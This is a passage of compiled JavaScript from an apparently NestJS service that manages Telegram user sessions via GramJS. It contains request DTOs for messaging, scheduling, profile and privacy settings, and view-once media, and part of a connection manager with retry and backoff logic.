    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "voice", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Document message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "document", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Round video message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "roundVideo", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Round voice message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "roundVoice", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/metadata-operations.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/Telegram/dto/metadata-operations.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BulkMessageOperationDto = exports.DialogsQueryDto = exports.MediaMetadataDto = exports.MetadataType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var MetadataType;
(function (MetadataType) {
    MetadataType["PHOTO"] = "photo";
    MetadataType["VIDEO"] = "video";
    MetadataType["DOCUMENT"] = "document";
})(MetadataType || (exports.MetadataType = MetadataType = {}));
class MediaMetadataDto {
    constructor() {
        this.limit = 50;
    }
}
exports.MediaMetadataDto = MediaMetadataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID to get metadata from' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaMetadataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message offset', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], MediaMetadataDto.prototype, "offset", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Maximum number of items', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], MediaMetadataDto.prototype, "limit", void 0);
class DialogsQueryDto {
    constructor() {
        this.limit = 100;
        this.offsetId = 0;
        this.archived = false;
    }
}
exports.DialogsQueryDto = DialogsQueryDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1),
    (0, class_validator_1.Max)(1000),
    __metadata("design:type", Number)
], DialogsQueryDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Dialog offset', required: false, type: Number, minimum: 0 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], DialogsQueryDto.prototype, "offsetId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Include archived chats', required: false, type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => {
        if (value === 'true')
            return true;
        if (value === 'false')
            return false;
        return value;
    }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DialogsQueryDto.prototype, "archived", void 0);
class BulkMessageOperationDto {
}
exports.BulkMessageOperationDto = BulkMessageOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkMessageOperationDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkMessageOperationDto.prototype, "toChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 }),
    (0, class_transformer_1.Transform)(({ value }) => Array.isArray(value) ? value.map(Number) : value),
    __metadata("design:type", Array)
], BulkMessageOperationDto.prototype, "messageIds", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/profile-settings.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/profile-settings.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ProfilePhotoDto = exports.SecuritySettingsDto = exports.PrivacySettingsDto = exports.UpdateProfileDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const telegram_1 = __webpack_require__(/*! ../../../interfaces/telegram */ "./src/interfaces/telegram.ts");
class UpdateProfileDto {
}
exports.UpdateProfileDto = UpdateProfileDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateProfileDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'About/bio information', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateProfileDto.prototype, "about", void 0);
class PrivacySettingsDto {
}
exports.PrivacySettingsDto = PrivacySettingsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Phone number visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "phoneNumber", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last seen visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "lastSeen", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Profile photos visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "profilePhotos", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message forwards visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "forwards", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Calls privacy', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group chats privacy', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "groups", void 0);
class SecuritySettingsDto {
}
exports.SecuritySettingsDto = SecuritySettingsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Enable/disable two-factor authentication' }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SecuritySettingsDto.prototype, "twoFactorAuth", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Active sessions limit', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)([1, 2, 3, 4, 5]),
    __metadata("design:type", Number)
], SecuritySettingsDto.prototype, "activeSessionsLimit", void 0);
class ProfilePhotoDto {
}
exports.ProfilePhotoDto = ProfilePhotoDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name/identifier of the photo to set' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ProfilePhotoDto.prototype, "name", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/schedule-operations.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/Telegram/dto/schedule-operations.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BatchProcessItemDto = exports.RescheduleMessageDto = exports.DeleteScheduledMessageDto = exports.GetScheduledMessagesDto = exports.ScheduleMessageDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const batch_operations_dto_1 = __webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts");
class ScheduleMessageDto extends batch_operations_dto_1.BaseBatchItemDto {
}
exports.ScheduleMessageDto = ScheduleMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message content' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ScheduleMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Date to schedule the message' }),
    (0, class_validator_1.IsDateString)(),
    (0, class_transformer_1.Transform)(({ value }) => new Date(value)),
    __metadata("design:type", String)
], ScheduleMessageDto.prototype, "scheduledTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message to reply to', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], ScheduleMessageDto.prototype, "replyTo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Silent notification', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ScheduleMessageDto.prototype, "silent", void 0);
class GetScheduledMessagesDto extends batch_operations_dto_1.BaseBatchItemDto {
    constructor() {
        super(...arguments);
        this.limit = 50;
    }
}
exports.GetScheduledMessagesDto = GetScheduledMessagesDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Maximum number of messages to return', required: false, default: 50 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], GetScheduledMessagesDto.prototype, "limit", void 0);
class DeleteScheduledMessageDto extends batch_operations_dto_1.BaseBatchItemDto {
}
exports.DeleteScheduledMessageDto = DeleteScheduledMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'ID of the scheduled message to delete' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], DeleteScheduledMessageDto.prototype, "messageId", void 0);
class RescheduleMessageDto {
}
exports.RescheduleMessageDto = RescheduleMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID containing the message' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], RescheduleMessageDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID to reschedule' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], RescheduleMessageDto.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'New schedule date (ISO string)' }),
    (0, class_validator_1.IsDateString)(),
    __metadata("design:type", String)
], RescheduleMessageDto.prototype, "newScheduleDate", void 0);
class BatchProcessItemDto {
}
exports.BatchProcessItemDto = BatchProcessItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID or message ID depending on operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchProcessItemDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID for operations that require it', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessItemDto.prototype, "messageId", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/send-message.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/Telegram/dto/send-message.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendMessageDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SendMessageDto {
}
exports.SendMessageDto = SendMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Target username or peer ID',
        example: 'someusername',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "peer", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message text to send',
        example: 'Hello from NestJS and GramJS!',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional message parse mode (Markdown, HTML)',
        required: false,
        example: 'Markdown',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "parseMode", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/update-username.dto.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/dto/update-username.dto.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUsernameDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class UpdateUsernameDto {
}
exports.UpdateUsernameDto = UpdateUsernameDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'New username to set for the Telegram user',
        example: 'new_username123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateUsernameDto.prototype, "newUsername", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/view-once-media.dto.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/dto/view-once-media.dto.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ViewOnceMediaDto = exports.MediaSourceType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var MediaSourceType;
(function (MediaSourceType) {
    MediaSourceType["PATH"] = "path";
    MediaSourceType["BASE64"] = "base64";
    MediaSourceType["BINARY"] = "binary";
})(MediaSourceType || (exports.MediaSourceType = MediaSourceType = {}));
class ViewOnceMediaDto {
}
exports.ViewOnceMediaDto = ViewOnceMediaDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Chat ID to send the view once media to',
        example: '123456789'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Source type of the media: url, base64, or binary',
        enum: MediaSourceType,
        example: 'url'
    }),
    (0, class_validator_1.IsEnum)(MediaSourceType),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "sourceType", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL of the media file (when sourceType is url)',
        required: false,
        example: 'https://example.com/image.jpg'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.PATH),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "path", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Base64 encoded media data (when sourceType is base64)',
        required: false,
        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.BASE64),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "base64Data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Binary media data (when sourceType is binary)',
        required: false,
        type: 'string',
        format: 'binary'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.BINARY),
    __metadata("design:type", Object)
], ViewOnceMediaDto.prototype, "binaryData", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional caption for the media',
        required: false,
        example: 'Check this out! It will disappear after viewing'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional filename for the media',
        required: false,
        example: 'secret_image.jpg'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "filename", void 0);


/***/ }),

/***/ "./src/components/Telegram/utils/connection-manager.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/utils/connection-manager.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.connectionManager = void 0;
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ../TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const parseError_1 = __webpack_require__(/*! ../../../utils/parseError */ "./src/utils/parseError.ts");
const telegram_logger_1 = __webpack_require__(/*! ./telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ../../../utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
class ConnectionManager {
    constructor() {
        this.cleanupInterval = null;
        this.usersService = null;
        this.isShuttingDown = false;
        this.DEFAULT_RETRY_CONFIG = {
            maxAttempts: 5,
            baseDelay: 1000,
            maxDelay: 30000,
            backoffMultiplier: 2,
            jitter: true
        };
        this.CONNECTION_TIMEOUT = 60000;
        this.MAX_CONCURRENT_CONNECTIONS = 100;
        this.COOLDOWN_PERIOD = 600000;
        this.VALIDATION_TIMEOUT = 10000;
        this.CLEANUP_TIMEOUT = 15000;
        this.MAX_CLEANUP_ATTEMPTS = 3;
        this.clients = new Map();
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.startCleanupInterval();
    }
    setUsersService(usersService) {
        this.usersService = usersService;
    }
    static getInstance() {
        if (!ConnectionManager.instance) {
            ConnectionManager.instance = new ConnectionManager();
        }
        return ConnectionManager.instance;
    }
    async handleShutdown() {
        this.logger.info('ConnectionManager', 'Graceful shutdown initiated');
        this.isShuttingDown = true;
        await this.disconnectAll();
        this.stopCleanupInterval();
    }
    createTimeoutPromise(timeoutMs, signal) {
        return new Promise((_, reject) => {
            const timeoutId = setTimeout(() => {
                reject(new Error('Operation timeout'));
            }, timeoutMs);
            if (signal) {
                signal.addEventListener('abort', () => {
                    clearTimeout(timeoutId);
                    reject(new Error('Operation aborted'));
                }, { once: true });
            }
        });
    }
    calculateRetryDelay(attempt, config) {
        let delay = Math.min(config.baseDelay * Math.pow(config.backoffMultiplier, attempt), config.maxDelay);
        if (config.jitter) {
            delay = delay * (0.5 + Math.random() * 0.5);
        }
        return Math.floor(delay);
    }
    shouldRetry(clientInfo, error) {
        const now = Date.now();
        if (clientInfo.connectionAttempts >= clientInfo.retryConfig.maxAttempts) {
            return false;
        }
        if (clientInfo.nextRetryAt && now < clientInfo.nextRetryAt) {
            return false;
        }
        const errorMessage = error.toLowerCase();
        const nonRetryableErrors = [
            'user_deactivated_ban',
            'auth_key_unregistered',
            'session_revoked',
            'phone_number_banned',
            'user_deactivated'
        ];
        if (nonRetryableErrors.some(errType => errorMessage.includes(errType))) {
            this.logger.info(clientInfo.client?.phoneNumber || 'unknown', `Non-retryable error detected: ${error}`);
            return false;
        }
        return true;
    }
    async waitForRetry(clientInfo) {
        if (!clientInfo.nextRetryAt)
            return;
        const now = Date.now();
        const waitTime = Math.max(0, clientInfo.nextRetryAt - now);
        if (waitTime > 0) {
            this.logger.info(clientInfo.client?.phoneNumber || 'unknown', `Waiting ${waitTime}ms before retry attempt ${clientInfo.connectionAttempts + 1}`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }
    }
    async validateConnection(mobile, client) {
        try {
            if (!client.connected()) {
                return false;
            }
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), this.VALIDATION_TIMEOUT);
            try {
                await Promise.race([
                    client.client.getMe(),
                    this.createTimeoutPromise(this.VALIDATION_TIMEOUT, controller.signal)
                ]);
                return true;
            }
            finally {
                clearTimeout(timeoutId);
                controller.abort();
            }
        }
        catch (error) {
            this.logger.error(mobile, 'Connection validation failed', error);
            return false;
        }
    }
    async getClient(mobile, options = {}) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        if (this.isShuttingDown) {
            throw new common_1.InternalServerErrorException('ConnectionManager is shutting down');
        }
        if (this.clients.size >= this.MAX_CONCURRENT_CONNECTIONS) {
            throw new common_1.InternalServerErrorException('Maximum connection limit reached');
        }
        const { autoDisconnect = true, handler = true, timeout = this.CONNECTION_TIMEOUT, retryConfig = {}, forceReconnect = false } = options;
        const mergedRetryConfig = {
            ...this.DEFAULT_RETRY_CONFIG,
            ...retryConfig
        };
        let clientInfo = this.clients.get(mobile);
        if (clientInfo?.client) {
            const isValid = await this.validateConnection(mobile, clientInfo.client);
            const isHealthy = clientInfo.state === 'connected' &&
                clientInfo.consecutiveFailures === 0 &&
                (Date.now() - clientInfo.lastSuccessfulConnection) < this.CONNECTION_TIMEOUT;
            if (!forceReconnect && isValid && isHealthy) {
                this.updateLastUsed(mobile);
                this.logger.info(mobile, 'Reusing validated healthy client');
                return clientInfo.client;
            }
            this.logger.info(mobile, `Cleaning up client - Valid: ${isValid}, Healthy: ${isHealthy}, ForceReconnect: ${forceReconnect}`);
            await this.unregisterClient(mobile);
            clientInfo = undefined;
        }
        if (clientInfo) {
            this.logger.info(mobile, 'Client info found but not valid, cleaning up');
            await this.unregisterClient(mobile);
            await (0, utils_1.sleep)(1000);
        }
        this.logger.info(mobile, 'Creating fresh client connection');
        return this.createNewClient(mobile, mergedRetryConfig, { autoDisconnect, handler, timeout });
    }
    async retryConnection(mobile, clientInfo, timeout) {
        try {
            clientInfo.state = 'connecting';
            clientInfo.connectionAttempts++;
            this.clients.set(mobile, clientInfo);
            this.logger.info(mobile, `Retry attempt ${clientInfo.connectionAttempts}/${clientInfo.retryConfig.maxAttempts}`);
            await Promise.race([
                clientInfo.client.connect(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Reconnection timeout')), timeout))
            ]);
            if (await this.validateConnection(mobile, clientInfo.client)) {
                clientInfo.state = 'connected';
                clientInfo.consecutiveFailures = 0;
                clientInfo.lastSuccessfulConnection = Date.now();
                delete clientInfo.nextRetryAt;
                delete clientInfo.lastError;
                this.clients.set(mobile, clientInfo);
                this.logger.info(mobile, 'Retry connection successful');
                return clientInfo.client;
            }
            throw new Error('Connection validation failed after retry');
        }
        catch (error) {
            return this.handleConnectionError(mobile, clientInfo, error);
        }
    }
    async handleConnectionError(mobile, clientInfo, error) {
        clientInfo.lastError = error.message;
        clientInfo.consecutiveFailures++;
        clientInfo.state = 'error';
        if (this.shouldRetry(clientInfo, error.message)) {
            const delay = this.calculateRetryDelay(clientInfo.connectionAttempts, clientInfo.retryConfig);
            clientInfo.nextRetryAt = Date.now() + delay;
            this.clients.set(mobile, clientInfo);
            this.logger.info(mobile, `Connection failed, will retry in ${delay}ms. Attempt ${clientInfo.connectionAttempts}/${clientInfo.retryConfig.maxAttempts}`);
        }
        else {
            this.logger.info(mobile, 'Connection failed with non-retryable error or max attempts reached');
            await this.unregisterClient(mobile);
        }
        const errorDetails = (0, parseError_1.parseError)(error, mobile, false);
        throw new common_1.BadRequestException(errorDetails.message);
    }
    async createNewClient(mobile, retryConfig, options) {
        if (!this.usersService) {
            throw new common_1.InternalServerErrorException('UsersService not initialized');
        }
        const users = await this.usersService.search({ mobile });
        const user = users[0];
        if (!user) {
            throw new common_1.BadRequestException('User not found');
        }
        this.logger.info(mobile, 'Creating new client', {
            autoDisconnect: options.autoDisconnect,
            handler: options.handler,
            retryConfig
        });
